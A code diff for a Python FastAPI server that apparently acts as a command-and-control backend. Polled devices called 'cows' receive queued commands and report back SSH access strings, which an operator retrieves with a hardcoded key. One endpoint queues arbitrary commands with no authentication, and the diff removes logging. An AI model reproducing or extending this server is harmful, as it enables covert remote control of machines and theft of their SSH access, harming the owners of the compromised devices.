@@ -1,12 +1,14 @@
+# server.py
 from fastapi import FastAPI
-from dotenv import load_dotenv
-import os
+import time as t
+from fastapi import HTTPException
+import asyncio
 
 app = FastAPI()
 
 clients = {
-    "cow1": {"name": "example", "command": "command here", "status": "online"},
-    "cow2": {"name": "example2", "command": "command here", "status": "offline"}
+    "cow1": {"name": "example", "command": "", "status": "online"},
+    "cow2": {"name": "example2", "command": "", "status": "offline"}
 }
 
 name_to_id = {
@@ -14,46 +16,60 @@ name_to_id = {
     "example2": "cow2"
 }
 
+stored_ssh = {}
+
 def newDevice(device_name):
     if device_name in name_to_id:
-        print("[~] Device already known.")
         return
-
     cowID = f"cow{len(clients) + 1}"
-    clients[cowID] = {
-        "name": device_name,
-        "command": "",
-        "status": "online"
-    }
+    clients[cowID] = {"name": device_name, "command": "", "status": "online"}
     name_to_id[device_name] = cowID
-    print(f"[+] Registered new device: {device_name} as {cowID}")
 
 def assignCommands(id, command):
     if id in clients:
         clients[id]["command"] = command
-        print(f"[+] Assigned command to {id}: {command}")
-    else:
-        print(f"[!] Tried to assign command to unknown cow: {id}")
 
 @app.get("/ping/{device_name}")
 async def ping(device_name: str):
-    print(f"[+] Ping received from: {device_name}")
     newDevice(device_name)
     cow_id = name_to_id[device_name]
-    return {"status": "ok", "command": clients[cow_id]["command"]}
+    return {"status": "ok", "command": clients[cow_id]["command"], "ID": cow_id}
+
+@app.get("/ping/ssh/{device_name}/{ssh}")
+async def sshReceived(device_name: str, ssh: str):
+    key = name_to_id.get(device_name)
+    print(f"[DEBUG] Storing SSH for {device_name} ({key}): {ssh}")
+    stored_ssh[key] = ssh
+    return {"status": "ok"}
 
 @app.get("/command/listcows/{key}")
 async def listcows(key: str):
     if key == "NoOneIsAroundToHelp":
-        print("[+] Listing all cows.")
         data = [(id, info["name"]) for id, info in clients.items()]
         return {"auth": "ok", "cows": data}
-    else:
-        print("[!] Unauthorized list request.")
+    return {"auth": "failed"}
+
+@app.get("/command/ssh/{cow}/{key}")
+async def ssh(cow: str, key: str):
+    if key != "NoOneIsAroundToHelp":
         return {"auth": "failed"}
+
+    assignCommands(cow, "ssh")
+
+    timeout = 20  # max seconds to wait
+    interval = 1  # polling interval in seconds
+    waited = 0
+
+    while waited < timeout:
+        ssh_string = stored_ssh.get(cow)
+        if ssh_string:
+            return {"auth": "ok", "ssh": ssh_string}
+        await asyncio.sleep(interval)
+        waited += interval
+
+    raise HTTPException(status_code=408, detail="Timeout waiting for SSH string")
 
 @app.get("/command/{cow},{command}")
 async def command(cow: str, command: str):
-    print(f"[+] Received command: '{command}' for cow: {cow}")
     assignCommands(cow, command)
     return {"status": "ok"}
